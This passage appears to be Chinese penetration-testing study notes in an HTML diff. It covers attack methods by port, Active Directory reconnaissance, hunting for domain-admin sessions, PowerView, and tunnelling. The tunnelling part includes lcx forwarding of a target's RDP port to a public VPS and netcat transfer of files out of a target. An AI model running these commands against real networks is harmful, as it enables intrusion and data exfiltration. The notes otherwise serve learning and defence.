+<td>允许匿名的上传、下载、爆破和嗅探操作</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>NFS 服务</td>
+<td>配置不当</td>
+</tr>
+<tr>
+<td>139</td>
+<td>SAMBA 服务</td>
+<td>爆破、未授权访问、远程代码执行</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP 目录访问协议</td>
+<td>注入、允许匿名访问、弱口令</td>
+</tr>
+</tbody></table>
+<ul>
+<li>远程连接服务端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH 远程连接</td>
+<td>爆破、SSH 隧道及内网代理转发、文件传输</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Telnet 远程连接</td>
+<td>爆破、嗅探、弱口令</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP 远程桌面连接</td>
+<td>Shift 后门（Windows Server 2003 及以下版本）、爆破</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>VNC</td>
+<td>弱口令爆破</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>PcAnywhere 服务</td>
+<td>抓取密码、代码执行</td>
+</tr>
+</tbody></table>
+<ul>
+<li>Web 应用服务端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>80、443、8080</td>
+<td>常见的 Web 服务端口</td>
+<td>Web 攻击、爆破、对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>7001、7002</td>
+<td>WebLogic 控制台</td>
+<td>Java 反序列化、弱口令</td>
+</tr>
+<tr>
+<td>8080、8089</td>
+<td>JBoss/Resin/Jetty/Jenkins</td>
+<td>反序列化、控制台弱口令</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>WebSphere 控制台</td>
+<td>Java 反序列化、弱口令</td>
+</tr>
+<tr>
+<td>4848</td>
+<td>GlassFish 控制台</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>Lotus Domino 邮件服务</td>
+<td>弱口令、信息泄露、爆破</td>
+</tr>
+<tr>
+<td>1000</td>
+<td>webmin 控制面板</td>
+<td>弱口令</td>
+</tr>
+</tbody></table>
+<ul>
+<li>数据库服务端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3306</td>
+<td>MySQL 数据库</td>
+<td>注入、提权、爆破</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL 数据库</td>
+<td>注入、提权、SA 弱口令、爆破</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle 数据库</td>
+<td>TNS 爆破、注入、反弹 SHELL</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>PostgreSQL 数据库</td>
+<td>爆破、注入、弱口令</td>
+</tr>
+<tr>
+<td>27017、27018</td>
+<td>MongoDB 数据库</td>
+<td>爆破、未授权访问</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis 数据库</td>
+<td>可尝试未授权访问、弱口令爆破</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>Sysbase/DB2 数据库</td>
+<td>爆破、注入</td>
+</tr>
+</tbody></table>
+<ul>
+<li>邮件服务端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>25</td>
+<td>SMTP 邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>110</td>
+<td>POP 协议</td>
+<td>爆破、嗅探</td>
+</tr>
+<tr>
+<td>143</td>
+<td>IMAP 协议</td>
+<td>爆破</td>
+</tr>
+</tbody></table>
+<ul>
+<li>网络常见协议端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53</td>
+<td>DNS 域名系统</td>
+<td>允许区域传送、DNS 劫持、缓存投毒、欺骗</td>
+</tr>
+<tr>
+<td>67、68</td>
+<td>DHCP 服务</td>
+<td>劫持、欺骗</td>
+</tr>
+<tr>
+<td>161</td>
+<td>SNMP 协议</td>
+<td>爆破、搜集目标内网信息</td>
+</tr>
+</tbody></table>
+<ul>
+<li>特殊服务端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2181</td>
+<td>ZooKeeper 服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>Zabbix 服务</td>
+<td>远程执行、SQL 注入</td>
+</tr>
+<tr>
+<td>9200、9300</td>
+<td>Elasticsearch 服务</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>Memcached 服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>512、513、514</td>
+<td>Linux rexec 服务</td>
+<td>爆破、远程登陆</td>
+</tr>
+<tr>
+<td>873</td>
+<td>rsync 服务</td>
+<td>匿名访问、文件上传</td>
+</tr>
+<tr>
+<td>3690</td>
+<td>SVN 服务</td>
+<td>SVN 泄露、未授权访问</td>
+</tr>
+<tr>
+<td>50000</td>
+<td>SAP Management Console</td>
+<td>远程执行</td>
+</tr>
+</tbody></table>
+<h3 id="收集域内基本信息"><a href="#收集域内基本信息" class="headerlink" title="收集域内基本信息"></a>收集域内基本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view /domain  # 查询域</span><br><span class="line">net view /domain:HACKE  # 查询域内所有计算机</span><br><span class="line">net group /domain  # 查询域内所有用户组列表</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查询所有域成员计算机列表</span><br><span class="line">net accounts /domain  # 获取域密码信息（域密码策略、密码长度、错误锁定等</span><br><span class="line">nltest /domain_trusts  # 获取域信任信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:hacke  # 查看域控制器的机器名</span><br><span class="line">nslookup -type=SRV _ldap._tcp  # 查看域控制器的主机名</span><br><span class="line">net time /domain  # 查看当前时间</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain  # 查看域控制器组</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 一般一个域中会存在多个域控制器，如果主控制器故障则可以保证正常工作</span></span></span><br><span class="line">netdom query pdc  # 查看域控制器组（主控</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取域内用户及管理员信息"><a href="#获取域内用户及管理员信息" class="headerlink" title="获取域内用户及管理员信息"></a>获取域内用户及管理员信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 查询所有域用户列表</span></span><br><span class="line">net user /domain  # 向域控制器进行查询</span><br><span class="line">wmic useraccount get /all  # 获取域内用户详细信息</span><br><span class="line">dsquery user  # 查看存在的用户（应该是域控才有</span><br><span class="line">net localgroup administrators  # 查询本地管理员组用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 查询域管理员用户组</span></span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查询域管理员用户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain  # 查询管理员用户组</span><br></pre></td></tr></table></figure>
+
+<p>常用 dsquery 命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer  # 查找目录中的计算机</span><br><span class="line">dsquery contact  # 查找目录中的联系人</span><br><span class="line">dsquery subnet  # 查找目录中的子网</span><br><span class="line">dsquery group  # 查找目录中的组</span><br><span class="line">dsquery ou  # 查找目录中的组织单位</span><br><span class="line">dsquery site  # 查找目录中的站点</span><br><span class="line">dsquery server  # 查找目录中的 AD DC/LDS 实例</span><br><span class="line">dsquery user  # 查找目录中的用户</span><br><span class="line">dsquery quota  # 查找目录中的配额规定</span><br><span class="line">dsquery partition  # 查找目录中的分区</span><br><span class="line">dsquery *  # 用通用的 LDAP 查询来查找目录中的任何对象</span><br></pre></td></tr></table></figure>
+
+<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><p>定位域管理员的常规渠道，一是日志，二是会话，日志是本地机器的管理员日志，可以使用脚本或 Wevutil 工具导出并查看，会话是指域内每台机器的登录会话，可以使用 netsess.exe 或 PowerView.exe 等工具查询（可以匿名查询，不需要权限）</p>
+<ul>
+<li>psloggedon.exe：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></li>
+<li>PVEFindADUser.exe：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></li>
+<li>netview.exe：<a target="_blank" rel="noopener" href="https://github.com/mubix/netview">GitHub - mubix/netview: Netview enumerates systems using WinAPI calls</a></li>
+<li>Nmap 的 NSE 脚本：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></li>
+<li>PowerView 脚本：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></li>
+<li>Empire 的 user_hunter 模块</li>
+</ul>
+<h3 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 本机检查</span></span><br><span class="line">net group &quot;Domain Admins&quot; /domain  # 获取域管理员列表</span><br><span class="line">tasklist /v  # 列出本机的所有进程及进程用户，寻找进程所有者为域管理员的进程</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 查询域控制器的域用户会话</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 原理：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话的系统列表</span></span></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain  # 查询域控制器列表</span><br><span class="line">net group &quot;Domain Admins&quot; /domain  # 收集域管理员列表</span><br><span class="line">NetSess -h  # 利用 NetSess.exe 收集所有活动域的会话列表</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 交叉引用域管理员列表与活动会话列表</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 将域控制器列表添加到 dcs.txt 中，将域管理员列表添加到 admins.txt 中，并于 NetSess.exe NetSess.exe 放在同一目录下，运行下面脚本</span></span></span><br><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 也可以利用 Get Domain Admins（GDA）批处理脚本：https://github.com/nullbind/Other-Projects/tree/master/GDA</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 查询远程系统中运行的任务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 首先从 Domain Admins 组中收集域管理员列表，将目标域系统列表添加到 ips.txt 文件中，将收集的域管理员列表添加到 names.txt 文件中，运行下面脚本</span></span></span><br><span class="line">FOR /F %i in (ips.txt) do @echo [+] %u &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n&gt;NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 扫描远程系统的 NetBIOS 信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 首先从 Domain Admins 组中收集域管理员列表，将目标域系统列表添加到 ips.txt 文件中，将收集的域管理员列表添加到 admins.txt 文件中，运行下面脚本</span></span></span><br><span class="line">FOR /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n&gt;NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell-收集信息"><a href="#PowerShell-收集信息" class="headerlink" title="PowerShell 收集信息"></a>PowerShell 收集信息</h3><p>PowerShell 常用执行权限：</p>
+<ul>
+<li>Resricted：默认设置，不允许执行任何脚本</li>
+<li>Allsigned：只能运行经过证书验证的脚本</li>
+<li>Unrestricted：权限最高，可以执行任意脚本</li>
+<li>RemoteSigned：对本地脚本不进行限制，对来自网络的脚本必须验证其签名</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span>  <span class="comment"># 查看执行权限</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted  <span class="comment"># 修改执行权限</span></span><br><span class="line"><span class="built_in">Import-Module</span> ./PowerView.ps1  <span class="comment"># 导入下载的 PowerView 脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView 常用命令</span></span><br><span class="line"><span class="built_in">Get-NetDomain</span>  <span class="comment"># 获取当前用户所在域的名称</span></span><br><span class="line"><span class="built_in">Get-NetUser</span>  <span class="comment"># 获取所有用户的详细信息</span></span><br><span class="line"><span class="built_in">Get-NetDomainController</span>  <span class="comment"># 获取所有域控制器的信息</span></span><br><span class="line"><span class="built_in">Get-NetComputer</span>  <span class="comment"># 获取域内所有机器的详细信息</span></span><br><span class="line"><span class="built_in">Get-NetOU</span>  <span class="comment"># 获取域内的 OU 信息</span></span><br><span class="line"><span class="built_in">Get-NetGroup</span>  <span class="comment"># 获取域内组和组成员的信息</span></span><br><span class="line"><span class="built_in">Get-NetFileServer</span>  <span class="comment"># 根据 SPN 获取当前域使用的文件服务器信息</span></span><br><span class="line"><span class="built_in">Get-NetShare</span>  <span class="comment"># 获取当前域内的所有网络共享信息</span></span><br><span class="line"><span class="built_in">Get-NetSession</span>  <span class="comment"># 获取指定服务器的会话</span></span><br><span class="line"><span class="built_in">Get-NetRDPSession</span>  <span class="comment"># 获取指定服务器的远程连接</span></span><br><span class="line"><span class="built_in">Get-NetProcess</span>  <span class="comment"># 获取远程主机的进程</span></span><br><span class="line"><span class="built_in">Get-UserEvent</span>  <span class="comment"># 获取指定用户的日志</span></span><br><span class="line"><span class="built_in">Get-ADObject</span>  <span class="comment"># 获取活动目录的对象</span></span><br><span class="line"><span class="built_in">Get-NetGPO</span>  <span class="comment"># 获取域内所有的组策略对象</span></span><br><span class="line"><span class="built_in">Get-DomainPolicy</span>  <span class="comment"># 获取域默认策略或域控制器策略</span></span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>  <span class="comment"># 获取域用户登陆的计算机信息及该用户是否拥有本地管理员权限</span></span><br><span class="line"><span class="built_in">Invoke-ProcessHunter</span>  <span class="comment"># 通过查询域内所有的机器进程找到特定用户</span></span><br><span class="line"><span class="built_in">Invoke-UserEventHunter</span>  <span class="comment"># 根据用户日志查询某域用户登陆过哪些域机器</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="域分析工具-BloodHound"><a href="#域分析工具-BloodHound" class="headerlink" title="域分析工具 BloodHound"></a>域分析工具 BloodHound</h3><p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/releases/">https://github.com/BloodHoundAD/BloodHound/releases/</a></p>
+<h3 id="敏感数据防护"><a href="#敏感数据防护" class="headerlink" title="敏感数据防护"></a>敏感数据防护</h3><h4 id="资料、数据、文件的定位流程"><a href="#资料、数据、文件的定位流程" class="headerlink" title="资料、数据、文件的定位流程"></a>资料、数据、文件的定位流程</h4><ul>
+<li>定位内部人事组织结构</li>
+<li>在内部人事组织结构中寻找需要监视的人员</li>
+<li>定位相关人员的机器</li>
+<li>监视相关人员存放文档的位置</li>
+<li>列出存放文档的服务器的目录</li>
+</ul>
+<h4 id="重点核心业务机器及敏感信息防护"><a href="#重点核心业务机器及敏感信息防护" class="headerlink" title="重点核心业务机器及敏感信息防护"></a>重点核心业务机器及敏感信息防护</h4><h5 id="核心业务机器"><a href="#核心业务机器" class="headerlink" title="核心业务机器"></a>核心业务机器</h5><ul>
+<li>高级管理人员、系统管理员、财务/人事/业务人员的个人计算机</li>
+<li>产品管理系统服务器</li>
+<li>办公系统服务器</li>
+<li>财务应用系统服务器</li>
+<li>核心产品源码服务器（IT 公司通常会架设自己的 SVN 或者 GIT 服务器）</li>
+<li>数据库服务器</li>
+<li>文件服务器、共享服务器</li>
+<li>电子邮件服务器</li>
+<li>网络监控系统服务器</li>
+<li>其他服务器（分公司、工厂）</li>
+</ul>
+<h5 id="敏感信息和敏感文件"><a href="#敏感信息和敏感文件" class="headerlink" title="敏感信息和敏感文件"></a>敏感信息和敏感文件</h5><ul>
+<li>站点源码备份文件、数据库备份文件等</li>
+<li>各类数据库的 Web 管理入口，例如 phpMyAdmin、Adminer</li>
+<li>浏览器密码和浏览器 Cookie</li>
+<li>其他用户会话、3389 和 ipc$ 连接记录、“回收站”中的信息等</li>
+<li>Windows 无线密码</li>
+<li>网络内部的各种账号和密码，包括电子邮箱、VPN、FTP、TeamView等</li>
+</ul>
+<h4 id="应用与文件形式信息的防护"><a href="#应用与文件形式信息的防护" class="headerlink" title="应用与文件形式信息的防护"></a>应用与文件形式信息的防护</h4><p>应用配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等</p>
+<h3 id="分析域内网段划分情况及拓扑结构"><a href="#分析域内网段划分情况及拓扑结构" class="headerlink" title="分析域内网段划分情况及拓扑结构"></a>分析域内网段划分情况及拓扑结构</h3><h4 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h4><p>常见的 Web 架构</p>
+<ul>
+<li>ASP + Access + IIS 5.0/6.0 + Windows Server 2003</li>
+<li>ASPX + MSSQL + IIS 7.0/7.5 + Windows Server 2008</li>
+<li>PHP + MySQL + IIS</li>
+<li>PHP + MySQL + Apache</li>
+<li>PHP + MySQL + Nginx</li>
+<li>JSP + MySQL + Nginx</li>
+<li>JSP + MSSQL + Tomcat</li>
+<li>JSP + Oracle + Tomcat</li>
+</ul>
+<h4 id="域内网段划分"><a href="#域内网段划分" class="headerlink" title="域内网段划分"></a>域内网段划分</h4><ul>
+<li><p>DMZ</p>
+</li>
+<li><p>办公区</p>
+<ul>
+<li><p>系统</p>
+<ul>
+<li>OA 系统</li>
+<li>邮件系统</li>
+<li>财务系统</li>
+<li>文件共享系统</li>
+<li>企业版杀毒系统</li>
+<li>内部应用监控系统</li>
+<li>运维管理系统</li>
+</ul>
+</li>
+<li><p>网段</p>
+<ul>
+<li>域管理网段</li>
+<li>内部服务器系统网段</li>
+<li>各部门分区网段</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>核心区</p>
+<ul>
+<li>系统<ul>
+<li>业务系统</li>
+<li>运维监控系统</li>
+<li>安全系统</li>
+</ul>
+</li>
+<li>网段<ul>
+<li>业务网段</li>
+<li>运维监控网段</li>
+<li>安全管理网段</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="常用隧道列举"><a href="#常用隧道列举" class="headerlink" title="常用隧道列举"></a>常用隧道列举</h4><ul>
+<li>网络层：IPv6 隧道、ICMP 隧道、GRE 隧道</li>
+<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
+<li>应用层：SSH 隧道、HTTP 隧道、HTTPS 隧道、DNS 隧道</li>
+</ul>
+<h4 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ICMP 协议</span></span><br><span class="line">ping &lt;IP or 域名&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP 协议</span></span><br><span class="line">nc &lt;IP PORT&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> HTTP 协议</span></span><br><span class="line">curl &lt;IP:PORT&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> DNS 协议</span></span><br><span class="line">nslookup www.baidu.com vps-ip  # Windows 自带 DNS 探测命令，没有指定 vps-ip 时，会从系统网络的 TCP/IP 属性中读取 DNS 服务器的地址</span><br><span class="line">dig @vps-ip www.baidu.com  #  Linux 自带 DNS 探测命令，没有指定 vps-ip 时，会从 /etc/resolv.conf 文件中读取系统配置的 DNS 服务器的地址</span><br></pre></td></tr></table></figure>
+
+<p>还有一种情况流量不能直接流出，需要在内网中设置代理服务器。常见于通过企业办公网段上网的场景，常用判断方法：</p>
+<ul>
+<li><p>查看网络连接，判断是否存在与其他机器的 8080（不绝对）等端口的链接（可以尝试运行 <code>ping -n 1 -a ip</code>）</p>
+</li>
+<li><p>查看内网中是否有主机名类似于 <code>proxy</code> 的机器</p>
+</li>
+<li><p>查看 IE 浏览器的直接代理</p>
+</li>
+<li><p>根据 pac 文件的路径（可能时本地路径，也可能时远程路径），将其下载下来并查看</p>
+</li>
+<li><p>利用 curl 命令进行确认，执行如下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com  # 不通</span><br><span class="line">curl -x proxy-ip:port www.baidu.com  # 通</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h3><h4 id="IPv6-隧道"><a href="#IPv6-隧道" class="headerlink" title="IPv6 隧道"></a>IPv6 隧道</h4><p>配置：<a target="_blank" rel="noopener" href="https://lesca.me/archives/how-to-build-ipv6-tunnel-on-windows.html">https://lesca.me/archives/how-to-build-ipv6-tunnel-on-windows.html</a></p>
+<p>支持工具</p>
+<ul>
+<li>socat</li>
+<li>6tunnel</li>
+<li>nt6tunnel</li>
+</ul>
+<h4 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h4><p>常用工具</p>
+<ul>
+<li><p>icmpsh：<a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  # 关闭本地系统 ICMP 应答，防止 shell 运行不稳定，恢复则设置为 0</span><br></pre></td></tr></table></figure></li>
+<li><p>PingTunnel：<a target="_blank" rel="noopener" href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
+</li>
+<li><p>icmptunnel</p>
+</li>
+<li><p>powershell icmp</p>
+</li>
+</ul>
+<p>防御方法</p>
+<ul>
+<li>检测同一来源的 ICmp 数据包的流量，一个正常的 ping 命令每秒最多发送两个数据包，而使用 ICMP 隧道的浏览器会在很短的时间内产生上千个 ICMP 数据包</li>
+<li>注意那些 Payload 大于 64bit 的ICMP 数据包</li>
+<li>寻找响应数据包中的 Payload 与请求数据包中的 Payload 不一致的 ICMP 数据包</li>
+<li>检查 ICMP 数据包的协议标签，例如 icmptunnel 会在所有的 ICMP Payload 前面添加 <code>TUNL</code> 标记来标识隧道</li>
+</ul>
+<h3 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h3><h4 id="lcx-端口转发"><a href="#lcx-端口转发" class="headerlink" title="lcx 端口转发"></a>lcx 端口转发</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 内网端口转发</span></span><br><span class="line">lcx.exe -slave &lt;公网主机IP&gt; 4444 127.0.0.1 3389  # 目标机器执行，将目标机器 3389 所有数据转发到公网 VPS 的 4444 端口</span><br><span class="line">lcx.exe -listen 4444 5555  # VPS 执行，将本机 4444 端口上监听的所有数据转发到本机的 5555 端口上</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 此时，用 mstsc 登录 `&lt;公网主机IP&gt;:5555`，或者在 VPS 上用 mstsc 登录主机 `127.0.0.1:5555` 即可访问目标服务器的 3389 端口</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 本地端口映射</span></span><br><span class="line">lcx.exe -tran 53 &lt;目标机器IP&gt; 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 当部分端口（如 3389）的数据无法通过防火墙，可以将相应端口的数据透传到防火墙允许的其他端口（如 53）</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 简单使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （1）命令查询</span></span></span><br><span class="line">nc -h</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （2）Banner 抓取</span></span></span><br><span class="line">nc -nv IP 21</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （3）连接远程主机</span></span></span><br><span class="line">nc -nvv IP 80</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （4）端口扫描</span></span></span><br><span class="line">nc -v IP 80</span><br><span class="line">nc -v -z IP 20-1024  # 扫描指定主机的某个端口段（扫描速度很慢）</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （5）端口监听</span></span></span><br><span class="line">nc -l -p 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （6）文件传输</span></span></span><br><span class="line">nc -lp 333 &gt; 1.txt  # 本地 VPS 主机，等待连接</span><br><span class="line">nc -vn IP 333 &lt; test.txt -q 1  # 目标主机，建立连接</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 